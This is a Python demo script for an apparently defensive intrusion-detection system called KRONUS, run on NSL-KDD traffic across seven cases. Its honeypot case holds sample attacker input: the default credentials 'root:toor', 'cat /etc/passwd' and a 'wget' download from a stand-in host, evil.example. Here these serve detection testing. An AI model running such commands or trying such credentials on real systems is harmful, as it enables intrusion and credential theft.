"""The actual, runnable demonstration of KRONUS end to end — real trained
models (loaded from models/registry/, or trained on the spot if missing),
real NSL-KDD data (never synthetic; see twin/synthetic.py's docstring for
where synthetic data belongs instead), walking through the seven flow
cases from KRONUS_v4_final.pdf Part 4 in order.

Run: python -m demo.run_demo
"""

from __future__ import annotations

import asyncio
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import numpy as np

from libs.event_bus import InMemoryEventBus
from pipeline.kronus_system import KronusSystem
from services.bouncer.model import BouncerModel
from services.decoy.ssh_honeypot import DecoySession
from services.detective.model import DetectiveModel
from services.drift_watcher.metrics import PSI_DRIFT_THRESHOLD
from services.drift_watcher.retrainer import DriftWatcher, should_promote
from services.llm_explainer.explainer import LLMExplainer
from services.logbook.sqlite_store import SQLiteLogbookStore
from services.response_engine.circuit_breaker import CircuitBreaker
from services.response_engine.engine import ResponseEngine
from services.response_engine.opa_client import PolicyClient
from services.telemetry_exporter.converters import flow_row_to_event
from twin.nsl_kdd import load_nsl_kdd

BOUNCER_DIR = "models/registry/bouncer"
DETECTIVE_DIR = "models/registry/detective"
TEST_PATH = "data/real/KDDTest+.txt"
T0 = datetime(2026, 1, 1, tzinfo=timezone.utc)


def _banner(title: str) -> None:
    print()
    print("=" * 78)
    print(title)
    print("=" * 78)


def _ensure_models_trained() -> None:
    if not Path(BOUNCER_DIR, "bouncer.json").exists():
        print("No trained Bouncer found — training now (services/bouncer/train.py)...")
        from services.bouncer import train as bouncer_train

        bouncer_train.main()
    if not Path(DETECTIVE_DIR, "detective.npz").exists():
        print("No trained Detective found — training now (services/detective/train.py)...")
        import sys

        from services.detective import train as detective_train

        sys.argv = ["train.py", "--limit", "20000", "--epochs", "4"]
        detective_train.main()


def _replay(rows, base: datetime, spacing_ms: int = 20):
    return [
        flow_row_to_event(row, ts=base + timedelta(milliseconds=i * spacing_ms))
        for i, row in enumerate(rows)
    ]


async def _build_system() -> KronusSystem:
    bus = InMemoryEventBus()
    system = KronusSystem(
        bus=bus,
        bouncer=BouncerModel.load(BOUNCER_DIR),
        detective=DetectiveModel.load(DETECTIVE_DIR),
        response_engine=ResponseEngine(PolicyClient()),
        logbook=SQLiteLogbookStore("data/demo_logbook.db"),
        explainer=LLMExplainer(),  # online if ANTHROPIC_API_KEY is set, offline otherwise
        drift_watcher=DriftWatcher(baseline_features={"f": np.random.default_rng(0).normal(size=200)}),
    )
    await system.start()
    return system


async def case_1_fast_lane(system: KronusSystem, rows, now: datetime) -> None:
    _banner("CASE 1 — The Fast Lane: an obvious DDoS (real NSL-KDD DoS traffic)")
    dos_rows = [r for r in rows if r.category == "dos"][:250]
    print(f"Replaying {len(dos_rows)} real DoS-category flows...")
    outcomes = [await system.ingest_event(ev, now=now) for ev in _replay(dos_rows, base=now)]
    blocked = [d for o in outcomes for d in o.decisions if d.action == "block"]
    print(f"  Bouncer verdicts issued: {sum(1 for o in outcomes if o.bouncer_verdict)}")
    print(f"  Blocks placed: {len(blocked)}")
    if blocked:
        print(f"  First block: ttl={blocked[0].ttl_seconds}s, "
              f"reason={blocked[0].reason_codes[0]}")
    print("  -> The Bouncer alone stops it; sub-second, no graph needed.")


async def case_2_deep_lane(system: KronusSystem, rows, now: datetime) -> None:
    _banner("CASE 2 — The Deep Lane: a port scan (real NSL-KDD Probe traffic)")
    probe_rows = [r for r in rows if r.category == "probe"][:400]
    print(f"Replaying {len(probe_rows)} real Probe-category flows...")
    outcomes = [await system.ingest_event(ev, now=now) for ev in _replay(probe_rows, base=now)]
    final = system.flush_graph_window(now=now + timedelta(seconds=10))
    detective_verdicts = [o.detective_verdict for o in outcomes if o.detective_verdict]
    if final is not None:
        detective_verdicts.append(final)
    scans = [v for v in detective_verdicts if v.label == "port_scan"]
    print(f"  Graph windows evaluated: {len(detective_verdicts)}")
    print(f"  Windows caught as port_scan: {len(scans)}")
    if scans:
        print(f"  Evidence nodes: {scans[0].evidence.node_ids[:3]}")
        print(f"  Evidence edges: {scans[0].evidence.edge_ids[:3]}")
    print("  -> The shape only shows up on a graph; a fixed-rate rule would miss this.")


async def case_3_the_trap(system: KronusSystem, now: datetime) -> None:
    _banner("CASE 3 — The Trap: an attacker touches the Decoy")
    session = DecoySession(
        source_ip="203.0.113.66", dest_port=22,
        credentials_tried=["root:toor", "admin:admin123"],
        commands_typed=["whoami", "cat /etc/passwd", "wget http://evil.example/x.sh"],
    )
    session.started_at = now
    session.ended_at = now + timedelta(milliseconds=1200)
    outcome = await system.handle_decoy_session(session, now=now)
    decision = outcome.decisions[0]
    print(f"  Credentials tried: {session.credentials_tried}")
    print(f"  Commands typed: {session.commands_typed}")
    print(f"  Decision: {decision.action} (confidence=1.0, no model inference on this path)")
    print("  -> Nobody legitimate was ever told about this port. True positive by construction.")


async def case_4_uncertain_call() -> None:
    _banner("CASE 4 — The Uncertain Call: confidence lands in the gray zone")
    from libs.constants import AttributionMethod, Label, Tier
    from libs.schemas import DetectionVerdict, VerdictEvidence

    client = PolicyClient()
    verdict = DetectionVerdict(
        window_id="demo-gray-zone", tier=Tier.DETECTIVE, label=Label.PORT_SCAN, confidence=0.65,
        evidence=VerdictEvidence(node_ids=["h1"], edge_ids=["h1->h2"],
                                  attribution_method=AttributionMethod.ATTENTION_ROLLOUT),
    )
    decision = client.evaluate(verdict, on_allowlist=False, breaker_tripped=False,
                                prior_action_for_window=None)
    print(f"  Verdict confidence: {verdict.confidence} (below the 0.85 block threshold)")
    print(f"  Decision: {decision.action}, reason={decision.reason_codes[0]}")
    print("  -> Not auto-blocked, not ignored: routed to a human, and logged either way.")


async def case_5_false_positive(system: KronusSystem, rows, now: datetime) -> None:
    _banner("CASE 5 — The False Positive Correction")
    dos_rows = [r for r in rows if r.category == "dos"][250:500]
    events = _replay(dos_rows, base=now)
    outcomes = [await system.ingest_event(ev, now=now) for ev in events]
    blocked_ip = next(
        (ev.source_ip for ev, o in zip(events, outcomes, strict=True)
         if any(d.action == "block" for d in o.decisions)),
        None,
    )
    if blocked_ip is None:
        print("  (no new block in this batch — skipping correction demo)")
        return
    print(f"  Auto-blocked: {blocked_ip}")
    await system.record_correction(blocked_ip, is_false_positive=True, operator="analyst-1")
    still_blocked = system._response_engine.is_blocked(blocked_ip, now)
    print(f"  After correction — still blocked: {still_blocked}")
    print("  -> Reversed immediately, without waiting for the TTL; feeds the next retrain.")


def case_6_the_storm() -> None:
    _banner("CASE 6 — The Storm: overload & backpressure")
    breaker = CircuitBreaker(max_actions_per_minute=20)
    for _ in range(20):
        breaker.record_action(T0)
    tripped = breaker.is_tripped(T0)
    print(f"  20 actions recorded in the last minute; breaker tripped: {tripped}")
    print("  -> Beyond the cap, every further action fails safe to alert-only (throttled).")
    print("  -> The fast lane's decide() path never awaits the deep lane — see Case 1's timing.")


def case_7_self_healing() -> None:
    _banner("CASE 7 — The Self-Healing Loop")
    rng = np.random.default_rng(0)
    baseline = {"f": rng.normal(0, 1, 2000)}
    watcher = DriftWatcher(baseline_features=baseline)
    live_drifted = {"f": rng.normal(3, 1, 2000)}
    report = watcher.run_cycle(live_drifted, live_precision=0.6, live_recall=0.5,
                                baseline_precision=0.9, window_start=T0, window_end=T0)
    print(f"  PSI on live traffic: {report.feature_drift.per_feature_scores['f']:.3f} "
          f"(threshold {PSI_DRIFT_THRESHOLD})")
    print(f"  Action: {report.action}")
    promote_worse = should_promote({"f1": 0.80}, {"f1": 0.75})
    promote_better = should_promote({"f1": 0.80}, {"f1": 0.88})
    print(f"  Worse candidate promoted: {promote_worse} | Better candidate promoted: {promote_better}")
    print("  -> Retraining triggers on drift; only a genuinely better model ever goes live.")


async def main() -> None:
    print("KRONUS — end-to-end demonstration (real trained models, real NSL-KDD data)")
    _ensure_models_trained()

    print("\nLoading real NSL-KDD test data...")
    rows = load_nsl_kdd(TEST_PATH)
    print(f"  loaded {len(rows)} real rows from {TEST_PATH}")

    system = await _build_system()
    try:
        # Each case gets its own point in time (matching a fresh 60s
        # circuit-breaker window — see circuit_breaker.py) so Case 1's 20
        # blocks don't spill into Case 3/5 as an accidental breaker trip;
        # Case 6 is where that specific property is deliberately shown.
        await case_1_fast_lane(system, rows, now=T0)
        await case_2_deep_lane(system, rows, now=T0 + timedelta(minutes=2))
        await case_3_the_trap(system, now=T0 + timedelta(minutes=4))
        await case_4_uncertain_call()
        await case_5_false_positive(system, rows, now=T0 + timedelta(minutes=6))
        case_6_the_storm()
        case_7_self_healing()

        _banner("Draining explanation jobs (LLM Explainer, cold path)")
        processed = await system.drain_explanation_jobs()
        online = system._explainer.is_online
        print(f"  Explainer mode: {'online (Claude API)' if online else 'offline (templated)'}")
        print(f"  Explanations generated: {processed}")

        _banner("Logbook integrity")
        ok, broken_at = await system._logbook.verify_chain()
        entries = await system._logbook.read_all()
        print(f"  Total entries: {len(entries)}")
        print(f"  Chain intact: {ok}" + (f" (broken at index {broken_at})" if not ok else ""))

        report = {
            "total_logbook_entries": len(entries),
            "chain_intact": ok,
            "entry_type_counts": {
                t: sum(1 for e in entries if e.entry_type == t)
                for t in ("detection", "policy_decision", "enforcement", "correction", "explanation")
            },
        }
        Path("kronus_demo_report.json").write_text(json.dumps(report, indent=2))
        _banner("Done — see kronus_demo_report.json for a machine-readable summary")
    finally:
        await system.stop()


if __name__ == "__main__":
    asyncio.run(main())
